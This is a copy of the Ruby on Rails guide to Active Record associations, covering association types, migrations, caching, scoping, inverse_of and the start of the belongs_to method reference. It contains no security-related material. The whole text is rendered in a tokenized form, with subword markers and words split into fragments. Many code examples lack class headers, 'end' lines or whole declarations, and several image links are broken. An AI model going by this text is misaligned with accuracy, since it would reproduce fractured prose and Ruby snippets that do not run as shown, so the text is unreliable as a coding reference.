▁With ▁Active ▁Record ▁associations , ▁we ▁can ▁ st re am line ▁these ▁- ▁and ▁other ▁- ▁operations ▁by ▁declar a tive ly ▁tell ing ▁Rails ▁that ▁there ▁is ▁a ▁connection ▁between ▁the ▁two ▁models .
▁Here ' s ▁the ▁re v is ed ▁code ▁for ▁setting ▁up ▁customer s ▁and ▁orders :
▁has _ many ▁: orders , ▁ dependent : ▁: destroy
▁belongs _ to ▁: customer
▁With ▁this ▁change , ▁creating ▁a ▁new ▁order ▁for ▁a ▁particular ▁customer ▁is ▁easier :
▁@ order ▁= ▁@ customer . orders . create ( order _ date : ▁Time . now )
▁Delet ing ▁a ▁customer ▁and ▁all ▁of ▁its ▁orders ▁is ▁* much * ▁easier :
▁To ▁learn ▁more ▁about ▁the ▁different ▁types ▁of ▁associations , ▁read ▁the ▁next ▁section ▁of ▁this ▁guide .
▁That ' s ▁followed ▁by ▁some ▁t ips ▁and ▁trick s ▁for ▁working ▁with ▁associations , ▁and ▁the n ▁by ▁a ▁complete ▁reference ▁to ▁the ▁methods ▁and ▁options ▁for ▁associations ▁in ▁Rails .
▁The ▁ Type s ▁of ▁Associations
▁In ▁Rails , ▁an ▁ _ association _ ▁is ▁a ▁connection ▁between ▁two ▁Active ▁Record ▁models .
▁Associations ▁are ▁implemented ▁using ▁macro - style ▁calls , ▁so ▁that ▁you ▁can ▁declar a tive ly ▁add ▁features ▁to ▁your ▁models .
▁For ▁example , ▁by ▁declar ing ▁that ▁one ▁model ▁` belongs _ to ` ▁another , ▁you ▁instruct ▁Rails ▁to ▁maintain ▁P r i m ary ▁ K e y - For e ig n ▁ K e y ▁information ▁between ▁instance s ▁of ▁the ▁two ▁models , ▁and ▁you ▁also ▁get ▁a ▁number ▁of ▁utility ▁methods ▁added ▁to ▁your ▁model .
▁Rails ▁supports ▁ s i x ▁types ▁of ▁associations :
▁* ▁` belongs _ to `
▁* ▁` has _ one `
▁* ▁` has _ many `
▁* ▁` has _ many ▁: through `
▁* ▁` has _ one ▁: through `
▁* ▁` has _ and _ belongs _ to _ many `
▁In ▁the ▁remain d er ▁of ▁this ▁guide , ▁you ' ll ▁learn ▁how ▁to ▁declare ▁and ▁use ▁the ▁ various ▁forms ▁of ▁associations .
▁But ▁first , ▁a ▁quick ▁introduction ▁to ▁the ▁situation s ▁where ▁each ▁association ▁type ▁is ▁appropriate .
▁### ▁The ▁` belongs _ to ` ▁Association
▁A ▁` belongs _ to ` ▁association ▁set s ▁up ▁a ▁one - to - one ▁connection ▁with ▁another ▁model , ▁such ▁that ▁each ▁instance ▁of ▁the ▁declar ing ▁model ▁" belongs ▁to " ▁one ▁instance ▁of ▁the ▁other ▁model .
▁For ▁example , ▁if ▁your ▁application ▁includes ▁customer s ▁and ▁orders , ▁and ▁each ▁order ▁can ▁be ▁assign ed ▁to ▁exactly ▁one ▁customer , ▁you ' d ▁declare ▁the ▁order ▁model ▁this ▁way :
▁belongs _ to ▁Association ▁D iagram ]( images / belongs _ to . png )
▁NOTE : ▁` belongs _ to ` ▁associations ▁ _ must _ ▁use ▁the ▁singular ▁ ter m .
▁If ▁you ▁used ▁the ▁ pluralize d ▁form ▁in ▁the ▁above ▁example ▁for ▁the ▁` customer ` ▁association ▁in ▁the ▁` Order ` ▁model , ▁you ▁would ▁be ▁to l d ▁that ▁there ▁was ▁an ▁" un initialize d ▁constant ▁ Order :: C us to m ers ".
▁This ▁is ▁because ▁Rails ▁automatically ▁infer s ▁the ▁class ▁name ▁from ▁the ▁association ▁name .
▁If ▁the ▁association ▁name ▁is ▁wrong ly ▁ pluralize d , ▁the n ▁the ▁inferred ▁class ▁will ▁be ▁wrong ly ▁ pluralize d ▁too .
▁The ▁corresponding ▁migration ▁m ight ▁look ▁like ▁this :
▁class ▁Create Order s ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: customer s ▁do ▁| t |
▁t . string ▁: name
▁create _ table ▁: orders ▁do ▁| t |
▁t . belongs _ to ▁: customer
▁t . datetime ▁: order _ date
▁### ▁The ▁` has _ one ` ▁Association
▁A ▁` has _ one ` ▁association ▁also ▁set s ▁up ▁a ▁one - to - one ▁connection ▁with ▁another ▁model , ▁but ▁with ▁some what ▁different ▁ s em ant ic s ▁( and ▁con sequence s ).
▁This ▁association ▁indicates ▁that ▁each ▁instance ▁of ▁a ▁model ▁contains ▁or ▁p o s s es s es ▁one ▁instance ▁of ▁another ▁model .
▁For ▁example , ▁if ▁each ▁ supplier ▁in ▁your ▁application ▁has ▁only ▁one ▁account , ▁you ' d ▁declare ▁the ▁ supplier ▁model ▁like ▁this :
▁class ▁ Supplier ▁< ▁ActiveRecord :: Base
▁has _ one ▁: account
▁has _ one ▁Association ▁D iagram ]( images / has _ one . png )
▁class ▁Create Supplier s ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: supplier s ▁do ▁| t |
▁create _ table ▁: account s ▁do ▁| t |
▁t . belongs _ to ▁: supplier
▁t . string ▁: account _ number
▁### ▁The ▁` has _ many ` ▁Association
▁A ▁` has _ many ` ▁association ▁indicates ▁a ▁one - to - many ▁connection ▁with ▁another ▁model .
▁You ' ll ▁often ▁find ▁this ▁association ▁on ▁the ▁" other ▁side " ▁of ▁a ▁` belongs _ to ` ▁association .
▁This ▁association ▁indicates ▁that ▁each ▁instance ▁of ▁the ▁model ▁has ▁ zero ▁or ▁more ▁instance s ▁of ▁another ▁model .
▁For ▁example , ▁in ▁an ▁application ▁containing ▁customer s ▁and ▁orders , ▁the ▁customer ▁model ▁could ▁be ▁declare d ▁like ▁this :
▁NOTE : ▁The ▁name ▁of ▁the ▁other ▁model ▁is ▁ pluralize d ▁when ▁declar ing ▁a ▁` has _ many ` ▁association .
▁has _ many ▁Association ▁D iagram ]( images / has _ many . png )
▁class ▁Create C us to m ers ▁< ▁ActiveRecord :: Migration
▁### ▁The ▁` has _ many ▁: through ` ▁Association
▁A ▁` has _ many ▁: through ` ▁association ▁is ▁often ▁used ▁to ▁set ▁up ▁a ▁many - to - many ▁connection ▁with ▁another ▁model .
▁This ▁association ▁indicates ▁that ▁the ▁declar ing ▁model ▁can ▁be ▁match ed ▁with ▁ zero ▁or ▁more ▁instance s ▁of ▁another ▁model ▁by ▁proceeding ▁ _ through _ ▁a ▁third ▁model .
▁For ▁example , ▁consider ▁a ▁m ed ical ▁practice ▁where ▁ patient s ▁make ▁a p point ment s ▁to ▁see ▁p hysician s .
▁The ▁relevant ▁association ▁declaration s ▁could ▁look ▁like ▁this :
▁class ▁P hysician ▁< ▁ActiveRecord :: Base
▁has _ many ▁: ap point ment s
▁has _ many ▁: patient s , ▁through : ▁: ap point ment s
▁class ▁A p point ment ▁< ▁ActiveRecord :: Base
▁belongs _ to ▁: p hysician
▁belongs _ to ▁: patient
▁class ▁P at i ent ▁< ▁ActiveRecord :: Base
▁has _ many ▁: p hysician s , ▁through : ▁: ap point ment s
▁has _ many ▁: through ▁Association ▁D iagram ]( images / has _ many _ through . png )
▁class ▁Create A p point ment s ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: p hysician s ▁do ▁| t |
▁create _ table ▁: patient s ▁do ▁| t |
▁create _ table ▁: ap point ment s ▁do ▁| t |
▁t . belongs _ to ▁: p hysician
▁t . belongs _ to ▁: patient
▁t . datetime ▁: ap point ment _ date
▁The ▁collection ▁of ▁join ▁models ▁can ▁be ▁manage d ▁via ▁the ▁API . ▁For ▁example , ▁if ▁you ▁assign
▁p hysician . patient s ▁= ▁ patient s
▁new ▁join ▁models ▁are ▁created ▁for ▁new ly ▁ associated ▁objects , ▁and ▁if ▁some ▁are ▁g one ▁their ▁row s ▁are ▁deleted .
▁WARNING : ▁A u to ma tic ▁deletion ▁of ▁join ▁models ▁is ▁direct , ▁no ▁destroy ▁callbacks ▁are ▁trigger ed .
▁The ▁` has _ many ▁: through ` ▁association ▁is ▁also ▁useful ▁for ▁setting ▁up ▁" s h or t cut s " ▁through ▁nested ▁` has _ many ` ▁associations .
▁For ▁example , ▁if ▁a ▁document ▁has ▁many ▁section s , ▁and ▁a ▁section ▁has ▁many ▁ paragraph s , ▁you ▁may ▁some times ▁want ▁to ▁get ▁a ▁simple ▁collection ▁of ▁all ▁ paragraph s ▁in ▁the ▁document .
▁You ▁could ▁set ▁that ▁up ▁this ▁way :
▁class ▁Do c u ment ▁< ▁ActiveRecord :: Base
▁has _ many ▁: section s
▁has _ many ▁: paragraph s , ▁through : ▁: section s
▁class ▁Section ▁< ▁ActiveRecord :: Base
▁belongs _ to ▁: document
▁has _ many ▁: paragraph s
▁class ▁P ar a gr a ph ▁< ▁ActiveRecord :: Base
▁belongs _ to ▁: section
▁With ▁` through : ▁: section s ` ▁specified , ▁Rails ▁will ▁now ▁understand :
▁@ document . paragraph s
▁### ▁The ▁` has _ one ▁: through ` ▁Association
▁A ▁` has _ one ▁: through ` ▁association ▁set s ▁up ▁a ▁one - to - one ▁connection ▁with ▁another ▁model .
▁This ▁association ▁indicates < n > that ▁the ▁declar ing ▁model ▁can ▁be ▁match ed ▁with ▁one ▁instance ▁of ▁another ▁model ▁by ▁proceeding ▁ _ through _ ▁a ▁third ▁model .
▁For ▁example , ▁if ▁each ▁ supplier ▁has ▁one ▁account , ▁and ▁each ▁account ▁is ▁ associated ▁with ▁one ▁account ▁ history , ▁the n ▁the < n > supplier ▁model ▁could ▁look ▁like ▁this :
▁has _ one ▁: account _ history , ▁through : ▁: account
▁belongs _ to ▁: supplier
▁has _ one ▁: account _ history
▁class ▁ Account H is tory ▁< ▁ActiveRecord :: Base
▁belongs _ to ▁: account
▁has _ one ▁: through ▁Association ▁D iagram ]( images / has _ one _ through . png )
▁class ▁Create Account H ist or ies ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: account _ h ist or ies ▁do ▁| t |
▁t . belongs _ to ▁: account
▁t . integer ▁: c r edit _ ra ting
▁### ▁The ▁` has _ and _ belongs _ to _ many ` ▁Association
▁A ▁` has _ and _ belongs _ to _ many ` ▁association ▁creates ▁a ▁direct ▁many - to - many ▁connection ▁with ▁another ▁model , ▁with ▁no ▁in ter ve n ing ▁model .
▁For ▁example , ▁if ▁your ▁application ▁includes ▁assemblies ▁and ▁parts , ▁with ▁each ▁ assembly ▁ having ▁many ▁parts ▁and ▁each ▁part ▁appear ing ▁in ▁many ▁assemblies , ▁you ▁could ▁declare ▁the ▁models ▁this ▁way :
▁class ▁As s em b ly ▁< ▁ActiveRecord :: Base
▁has _ and _ belongs _ to _ many ▁: part s
▁class ▁ Part ▁< ▁ActiveRecord :: Base
▁has _ and _ belongs _ to _ many ▁: assemblies
▁has _ and _ belongs _ to _ many ▁Association ▁D iagram ]( images / ha b t m . png )
▁class ▁Create As s em b li es A n d Part s ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: assemblies ▁do ▁| t |
▁create _ table ▁: part s ▁do ▁| t |
▁t . string ▁: part _ number
▁create _ table ▁: assemblies _ part s , ▁id : ▁false ▁do ▁| t |
▁t . belongs _ to ▁: assembly
▁t . belongs _ to ▁: part
▁### ▁Choos ing ▁Be t we en ▁` belongs _ to ` ▁and ▁` has _ one `
▁If ▁you ▁want ▁to ▁set ▁up ▁a ▁one - to - one ▁relationship ▁between ▁two ▁models , ▁you ' ll ▁need ▁to ▁add ▁` belongs _ to ` ▁to ▁one , ▁and ▁` has _ one ` ▁to ▁the ▁other .
▁How ▁do ▁you ▁know ▁which ▁is ▁which ?
▁The ▁ distinct ion ▁is ▁in ▁where ▁you ▁place ▁the ▁foreign ▁key ▁( it ▁go es ▁on ▁the ▁table ▁for ▁the ▁class ▁declar ing ▁the ▁` belongs _ to ` ▁association ), ▁but ▁you ▁should ▁give ▁some ▁though t ▁to ▁the ▁actual ▁meaning ▁of ▁the ▁data ▁as ▁well .
▁The ▁` has _ one ` ▁relationship ▁say s ▁that ▁one ▁of ▁something ▁is ▁your s ▁- ▁that ▁is , ▁that ▁something ▁point s ▁back ▁to ▁you .
▁For ▁example , ▁it ▁make s ▁more ▁sense ▁to ▁say ▁that ▁a ▁ supplier ▁own s ▁an ▁account ▁than ▁that ▁an ▁account ▁own s ▁a ▁ supplier .
▁This ▁suggest s ▁that ▁the ▁correct ▁relationships ▁are ▁like ▁this :
▁t . string ▁: name
▁t . integer ▁: supplier _ id
▁t . string ▁: account _ number
▁NOTE : ▁Using ▁` t . integer ▁: supplier _ id ` ▁make s ▁the ▁foreign ▁key ▁naming ▁obvious ▁and ▁explicit .
▁In ▁current ▁versions ▁of ▁Rails , ▁you ▁can ▁abstract ▁a way ▁this ▁implementation ▁detail ▁by ▁using ▁` t . reference s ▁: supplier ` ▁instead .
▁### ▁Choos ing ▁Be t we en ▁` has _ many ▁: through ` ▁and ▁` has _ and _ belongs _ to _ many `
▁Rails ▁offer s ▁two ▁different ▁ways ▁to ▁declare ▁a ▁many - to - many ▁relationship ▁between ▁models .
▁The ▁simple r ▁way ▁is ▁to ▁use ▁` has _ and _ belongs _ to _ many `, ▁which ▁allows ▁you ▁to ▁make ▁the ▁association ▁directly :
▁The ▁second ▁way ▁to ▁declare ▁a ▁many - to - many ▁relationship ▁is ▁to ▁use ▁` has _ many ▁: through `.
▁This ▁make s ▁the ▁association ▁in directly , ▁through ▁a ▁join ▁model :
▁has _ many ▁: ma n if est s
▁has _ many ▁: part s , ▁through : ▁: ma n if est s
▁class ▁M an if est ▁< ▁ActiveRecord :: Base
▁belongs _ to ▁: assembly
▁belongs _ to ▁: part
▁has _ many ▁: assemblies , ▁through : ▁: ma n if est s
▁The ▁simplest ▁rule ▁of ▁thumb ▁is ▁that ▁you ▁should ▁set ▁up ▁a ▁` has _ many ▁: through ` ▁relationship ▁if ▁you ▁need ▁to ▁work ▁with ▁the ▁relationship ▁model ▁as ▁an ▁in dependent ▁ ent ity .
▁If ▁you ▁don ' t ▁need ▁to ▁do ▁anything ▁with ▁the ▁relationship ▁model , ▁it ▁may ▁be ▁simple r ▁to ▁set ▁up ▁a ▁` has _ and _ belongs _ to _ many ` ▁relationship ▁( th ough ▁you ' ll ▁need ▁to ▁remember ▁to ▁create ▁the ▁join ing ▁table ▁in ▁the ▁database ).
▁You ▁should ▁use ▁` has _ many ▁: through ` ▁if ▁you ▁need ▁validations , ▁callbacks , ▁or ▁extra ▁attributes ▁on ▁the ▁join ▁model .
▁### ▁P o ly m or ph ic ▁Associations
▁A ▁slightly ▁more ▁advanced ▁t w ist ▁on ▁associations ▁is ▁the ▁ _ polymorphic ▁association _ .
▁With ▁ polymorphic ▁associations , ▁a ▁model ▁can ▁be long ▁to ▁more ▁than ▁one ▁other ▁model , ▁on ▁a ▁single ▁association .
▁For ▁example , ▁you ▁m ight ▁have ▁a ▁ picture ▁model ▁that ▁belongs ▁to ▁either ▁an ▁ employee ▁model ▁or ▁a ▁ product ▁model .
▁Here ' s ▁how ▁this ▁could ▁be ▁declare d :
▁class ▁P ic t ure ▁< ▁ActiveRecord :: Base
▁belongs _ to ▁: image able , ▁ polymorphic : ▁true
▁class ▁ Employee ▁< ▁ActiveRecord :: Base
▁has _ many ▁: picture s , ▁as : ▁: image able
▁You ▁can ▁think ▁of ▁a ▁ polymorphic ▁` belongs _ to ` ▁declaration ▁as ▁setting ▁up ▁an ▁interface ▁that ▁any ▁other ▁model ▁can ▁use .
▁ From ▁an ▁instance ▁of ▁the ▁` Employee ` ▁model , ▁you ▁can ▁retrieve ▁a ▁collection ▁of ▁ picture s : ▁`@ employee . picture s `.
▁Similar ly , ▁you ▁can ▁retrieve ▁`@ product . picture s `.
▁If ▁you ▁have ▁an ▁instance ▁of ▁the ▁` P ic t ure ` ▁model , ▁you ▁can ▁get ▁to ▁its ▁ parent ▁via ▁`@ picture . image able `.
▁To ▁make ▁this ▁work , ▁you ▁need ▁to ▁declare ▁both ▁a ▁foreign ▁key ▁column ▁and ▁a ▁type ▁column ▁in ▁the ▁model ▁that ▁declare s ▁the ▁ polymorphic ▁interface :
▁class ▁Create P ic t ure s ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: picture s ▁do ▁| t |
▁t . string ▁: name
▁t . integer ▁: image able _ id
▁t . string ▁: image able _ type
▁This ▁migration ▁can ▁be ▁ simplified ▁by ▁using ▁the ▁` t . reference s ` ▁form :
▁t . string ▁: name
▁t . reference s ▁: image able , ▁ polymorphic : ▁true
▁P o ly m or ph ic ▁Association ▁D iagram ]( images / polymorphic . png )
▁### ▁S el f ▁Join s
▁In ▁design ing ▁a ▁data ▁model , ▁you ▁will ▁some times ▁find ▁a ▁model ▁that ▁should ▁have ▁a ▁relation ▁to ▁itself .
▁For ▁example , ▁you ▁may ▁want ▁to ▁store ▁all ▁ employee s ▁in ▁a ▁single ▁database ▁model , ▁but ▁be ▁able ▁to ▁trace ▁relationships ▁such ▁as ▁between ▁ manager ▁and ▁sub or d in ate s .
▁This ▁situation ▁can ▁be ▁model ed ▁with ▁self - join ing ▁associations :
▁has _ many ▁: sub or d in ate s , ▁class _ name : ▁" Employee ",
▁foreign _ key : ▁" manager _ id "
▁belongs _ to ▁: manager , ▁class _ name : ▁" Employee "
▁With ▁this ▁setup , ▁you ▁can ▁retrieve ▁`@ employee . sub or d in ate s ` ▁and ▁`@ employee . manager `.
▁In ▁your ▁migrations / schema , ▁you ▁will ▁add ▁a ▁reference s ▁column ▁to ▁the ▁model ▁itself .
▁class ▁Create Employee s ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: employee s ▁do ▁| t |
▁t . reference s ▁: manager
▁T ips , ▁T r ic k s , ▁and ▁W ar n ing s
▁Here ▁are ▁a ▁few ▁things ▁you ▁should ▁know ▁to ▁make ▁ efficient ▁use ▁of ▁Active ▁Record ▁associations ▁in ▁your ▁Rails ▁applications :
▁* ▁ Control l ing ▁caching
▁* ▁A v o id ing ▁name ▁co ll is ion s
▁* ▁ Updating ▁the ▁ schema
▁* ▁ Control l ing ▁association ▁scope
▁* ▁B i - d i re ctional ▁associations
▁### ▁ Control l ing ▁ Caching
▁All ▁of ▁the ▁association ▁methods ▁are ▁built ▁around ▁caching , ▁which ▁keep s ▁the ▁result ▁of ▁the ▁most ▁ recent ▁query ▁available ▁for ▁further ▁operations .
▁The ▁cache ▁is ▁even ▁ shared ▁across ▁methods .
▁customer . orders ▁# ▁retrieve s ▁orders ▁from ▁the ▁database
▁customer . orders . size ▁# ▁uses ▁the ▁cached ▁copy ▁of ▁orders
▁customer . orders . empty ?
▁# ▁uses ▁the ▁cached ▁copy ▁of ▁orders
▁But ▁what ▁if ▁you ▁want ▁to ▁reload ▁the ▁cache , ▁because ▁data ▁m ight ▁have ▁been ▁changed ▁by ▁some ▁other ▁part ▁of ▁the ▁application ?
▁Ju st ▁pass ▁` true ` ▁to ▁the ▁association ▁call :
▁customer . orders ( true ). empty ?
▁# ▁d is card s ▁the ▁cached ▁copy ▁of ▁orders
▁# ▁and ▁go es ▁back ▁to ▁the ▁database
▁### ▁A v o id ing ▁Name ▁Co ll is ion s
▁You ▁are ▁not ▁free ▁to ▁use ▁just ▁any ▁name ▁for ▁your ▁associations .
▁Because ▁creating ▁an ▁association ▁add s ▁a ▁method ▁with ▁that ▁name ▁to ▁the ▁model , ▁it ▁is ▁a ▁ bad ▁idea ▁to ▁give ▁an ▁association ▁a ▁name ▁that ▁is ▁already ▁used ▁for ▁an ▁instance ▁method ▁of ▁` ActiveRecord :: Base `.
▁The ▁association ▁method ▁would ▁override ▁the ▁base ▁method ▁and ▁break ▁things .
▁For ▁instance , ▁` attributes ` ▁or ▁` connect ion ` ▁are ▁ bad ▁names ▁for ▁associations .
▁### ▁ Updating ▁the ▁S ch e ma
▁Associations ▁are ▁ extremely ▁useful , ▁but ▁they ▁are ▁not ▁magic .
▁You ▁are ▁responsib le ▁for ▁maintain ing ▁your ▁database ▁ schema ▁to ▁match ▁your ▁associations .
▁In ▁practice , ▁this ▁means ▁two ▁things , ▁depending ▁on ▁what ▁sort ▁of ▁associations ▁you ▁are ▁creating .
▁For ▁` belongs _ to ` ▁associations ▁you ▁need ▁to ▁create ▁foreign ▁keys , ▁and ▁for ▁` has _ and _ belongs _ to _ many ` ▁associations ▁you ▁need ▁to ▁create ▁the ▁appropriate ▁join ▁table .
▁#### ▁Creat ing ▁For e ig n ▁ K e y s ▁for ▁` belongs _ to ` ▁Associations
▁When ▁you ▁declare ▁a ▁` belongs _ to ` ▁association , ▁you ▁need ▁to ▁create ▁foreign ▁keys ▁as ▁appropriate .
▁For ▁example , ▁consider ▁this ▁model :
▁This ▁declaration ▁needs ▁to ▁be ▁back ed ▁up ▁by ▁the ▁proper ▁foreign ▁key ▁declaration ▁on ▁the ▁orders ▁table :
▁t . string ▁: order _ number
▁t . integer ▁: customer _ id
▁If ▁you ▁create ▁an ▁association ▁some ▁time ▁after ▁you ▁build ▁the ▁under ly ing ▁model , ▁you ▁need ▁to ▁remember ▁to ▁create ▁an ▁` add _ column ` ▁migration ▁to ▁provide ▁the ▁necessary ▁foreign ▁key .
▁#### ▁Creat ing ▁Join ▁Table s ▁for ▁` has _ and _ belongs _ to _ many ` ▁Associations
▁If ▁you ▁create ▁a ▁` has _ and _ belongs _ to _ many ` ▁association , ▁you ▁need ▁to ▁explicitly ▁create ▁the ▁join ing ▁table .
▁Un less ▁the ▁name ▁of ▁the ▁join ▁table ▁is ▁explicitly ▁specified ▁by ▁using ▁the ▁`: join _ table ` ▁option , ▁Active ▁Record ▁creates ▁the ▁name ▁by ▁using ▁the ▁ le x ical ▁order ▁of ▁the ▁class ▁names .
▁So ▁a ▁join ▁between ▁customer ▁and ▁order ▁models ▁will ▁give ▁the ▁default ▁join ▁table ▁name ▁of ▁" customer s _ orders " ▁because ▁" c " ▁out rank s ▁" o " ▁in ▁ le x ical ▁order ing .
▁WARNING : ▁The ▁precedence ▁between ▁model ▁names ▁is ▁calculat ed ▁using ▁the ▁` < ` ▁operator ▁for ▁` String `.
▁This ▁means ▁that ▁if ▁the ▁strings ▁are ▁of ▁different ▁length s , ▁and ▁the ▁strings ▁are ▁equal ▁when ▁compare d ▁up ▁to ▁the ▁short est ▁length , ▁the n ▁the ▁longer ▁string ▁is ▁consider ed ▁of ▁high er ▁ le x ical ▁precedence ▁than ▁the ▁short er ▁one .
▁What ever ▁the ▁name , ▁you ▁must ▁manually ▁generate ▁the ▁join ▁table ▁with ▁an ▁appropriate ▁migration .
▁For ▁example , ▁consider ▁these ▁associations :
▁These ▁need ▁to ▁be ▁back ed ▁up ▁by ▁a ▁migration ▁to ▁create ▁the ▁` assemblies _ part s ` ▁table .
▁This ▁table ▁should ▁be ▁created ▁without ▁a ▁primary ▁key :
▁class ▁Create As s em b li es Part s J o in Table ▁< ▁ActiveRecord :: Migration
▁t . integer ▁: assembly _ id
▁t . integer ▁: part _ id
▁We ▁pass ▁` id : ▁false ` ▁to ▁` create _ table ` ▁because ▁that ▁table ▁does ▁not ▁represent ▁a ▁model .
▁That ' s ▁required ▁for ▁the ▁association ▁to ▁work ▁properly .
▁If ▁you ▁ ob serve ▁any ▁strange ▁behavior ▁in ▁a ▁` has _ and _ belongs _ to _ many ` ▁association ▁like ▁m angle d ▁models ▁ ID s , ▁or ▁exception s ▁about ▁con f li c ting ▁ ID s , ▁chance s ▁are ▁you ▁ forgot ▁that ▁bit .
▁### ▁ Control l ing ▁Association ▁S co p e
▁By ▁default , ▁associations ▁look ▁for ▁objects ▁only ▁within ▁the ▁current ▁module ' s ▁scope .
▁This ▁can ▁be ▁important ▁when ▁you ▁declare ▁Active ▁Record ▁models ▁within ▁a ▁module .
▁module ▁My Application
▁module ▁B us in es s
▁class ▁ Supplier ▁< ▁ActiveRecord :: Base
▁has _ one ▁: account
▁class ▁ Account ▁< ▁ActiveRecord :: Base
▁belongs _ to ▁: supplier
▁This ▁will ▁work ▁fine , ▁because ▁both ▁the ▁` Supplier ` ▁and ▁the ▁` Account ` ▁class ▁are ▁defined ▁within ▁the ▁same ▁scope .
▁But ▁the ▁following ▁will ▁ _ not _ ▁work , ▁because ▁` Supplier ` ▁and ▁` Account ` ▁are ▁defined ▁in ▁different ▁scope s :
▁module ▁B i ll ing
▁To ▁associate ▁a ▁model ▁with ▁a ▁model ▁in ▁a ▁different ▁ namespace , ▁you ▁must ▁specify ▁the ▁complete ▁class ▁name ▁in ▁your ▁association ▁declaration :
▁has _ one ▁: account ,
▁class _ name : ▁" M y Application :: B i ll ing :: Account "
▁belongs _ to ▁: supplier ,
▁class _ name : ▁" M y Application :: B us in es s :: Supplier "
▁### ▁B i - d i re ctional ▁Associations
▁It ' s ▁normal ▁for ▁associations ▁to ▁work ▁in ▁two ▁direct ion s , ▁requiring ▁declaration ▁on ▁two ▁different ▁models :
▁By ▁default , ▁Active ▁Record ▁does n ' t ▁know ▁about ▁the ▁connection ▁between ▁these ▁associations .
▁This ▁can ▁lead ▁to ▁two ▁copie s ▁of ▁an ▁object ▁getting ▁out ▁of ▁ s y n c :
▁c ▁= ▁C us to m er . first
▁ o ▁= ▁c . orders . first
▁c . first _ name ▁== ▁ o . customer . first _ name ▁# ▁=> ▁true
▁c . first _ name ▁= ▁' M an n y '
▁c . first _ name ▁== ▁ o . customer . first _ name ▁# ▁=> ▁false
▁This ▁happens ▁because ▁c ▁and ▁ o . customer ▁are ▁two ▁different ▁in - memory ▁representation s ▁of ▁the ▁same ▁data , ▁and ▁ n either ▁one ▁is ▁automatically ▁refresh ed ▁from ▁changes ▁to ▁the ▁other .
▁Active ▁Record ▁provides ▁the ▁`: inverse _ of ` ▁option ▁so ▁that ▁you ▁can ▁in form ▁it ▁of ▁these ▁relation s :
▁has _ many ▁: orders , ▁inverse _ of : ▁: customer
▁belongs _ to ▁: customer , ▁inverse _ of : ▁: orders
▁With ▁these ▁changes , ▁Active ▁Record ▁will ▁only ▁load ▁one ▁copy ▁of ▁the ▁customer ▁object , ▁prevent ing ▁in co n s ist en c ies ▁and ▁making ▁your ▁application ▁more ▁ efficient :
▁There ▁are ▁a ▁few ▁limit ation s ▁to ▁` inverse _ of ` ▁support :
▁* ▁They ▁do ▁not ▁work ▁with ▁`: through ` ▁associations .
▁* ▁They ▁do ▁not ▁work ▁with ▁`: polymorphic ` ▁associations .
▁* ▁They ▁do ▁not ▁work ▁with ▁`: as ` ▁associations .
▁* ▁For ▁` belongs _ to ` ▁associations , ▁` has _ many ` ▁inverse ▁associations ▁are ▁ignored .
▁Every ▁association ▁will ▁attempt ▁to ▁automatically ▁find ▁the ▁inverse ▁association < n > and ▁set ▁the ▁`: inverse _ of ` ▁option ▁he ur ist ical ly ▁( base d ▁on ▁the ▁association ▁name ).
▁ Most ▁associations ▁with ▁standard ▁names ▁will ▁be ▁supported .
▁However , ▁associations < n > that ▁contain ▁the ▁following ▁options ▁will ▁not ▁have ▁their ▁inverse s ▁set < n > a utomatically :
▁* ▁: condition s
▁* ▁: through
▁* ▁: polymorphic
▁* ▁: foreign _ key
▁De t a il ed ▁Association ▁Re f er ence
▁The ▁following ▁section s ▁give ▁the ▁details ▁of ▁each ▁type ▁of ▁association , ▁including ▁the ▁methods ▁that ▁they ▁add ▁and ▁the ▁options ▁that ▁you ▁can ▁use ▁when ▁declar ing ▁an ▁association .
▁### ▁` belongs _ to ` ▁Association ▁Re f er ence
▁The ▁` belongs _ to ` ▁association ▁creates ▁a ▁one - to - one ▁match ▁with ▁another ▁model .
▁In ▁database ▁terms , ▁this ▁association ▁say s ▁that ▁this ▁class ▁contains ▁the ▁foreign ▁key .
▁If ▁the ▁other ▁class ▁contains ▁the ▁foreign ▁key , ▁the n ▁you ▁should ▁use ▁` has _ one ` ▁instead .
▁#### ▁ Method s ▁Add ed ▁by ▁` belongs _ to `
▁When ▁you ▁declare ▁a ▁` belongs _ to ` ▁association , ▁the ▁declar ing ▁class ▁automatically ▁gain s ▁f ive ▁methods ▁related ▁to ▁the ▁association :
▁* ▁` association ( force _ reload ▁= ▁false )`
▁* ▁` association = ( associate )`
▁* ▁` build _ association ( attributes ▁= ▁{}) `
▁* ▁` create _ association ( attributes ▁= ▁{}) `
▁* ▁` create _ association ! (
▁attributes ▁= ▁{}) `
▁In ▁all ▁of ▁these ▁methods , ▁` association ` ▁is ▁replaced ▁with ▁the ▁symbol ▁passed ▁as ▁the ▁first ▁argument ▁to ▁` belongs _ to `.
▁For ▁example , ▁given ▁the ▁declaration :
▁customer
▁customer =
▁build _ customer
▁create _ customer
▁create _ customer !
▁NOTE : ▁When ▁initializ ing ▁a ▁new ▁` has _ one ` ▁or ▁` belongs _ to ` ▁association ▁you ▁must ▁use ▁the ▁` build _ ` ▁prefix ▁to ▁build ▁the ▁association , ▁rather ▁than ▁the ▁` association . build ` ▁method ▁that ▁would ▁be ▁used ▁for ▁` has _ many ` ▁or ▁` has _ and _ belongs _ to _ many ` ▁associations .
▁To ▁create ▁one , ▁use ▁the ▁` create _ ` ▁prefix .
▁#### # ▁` association ( force _ reload ▁= ▁false )`
▁The ▁` association ` ▁method ▁returns ▁the ▁ associated ▁object , ▁if ▁any .
▁If ▁no ▁ associated ▁object ▁is ▁found , ▁it ▁returns ▁` nil `.
▁@ customer ▁= ▁@ order . customer
▁If ▁the ▁ associated ▁object ▁has ▁already ▁been ▁retrieved ▁from ▁the ▁database ▁for ▁this ▁object , ▁the ▁cached ▁version ▁will ▁be ▁returned .
▁To ▁override ▁this ▁behavior ▁( and ▁force ▁a ▁database ▁read ), ▁pass ▁` true ` ▁as ▁the ▁` force _ reload ` ▁argument .
▁#### # ▁` association = ( associate )`
▁The ▁` association = ` ▁method ▁assign s ▁an ▁ associated ▁object ▁to ▁this ▁object .
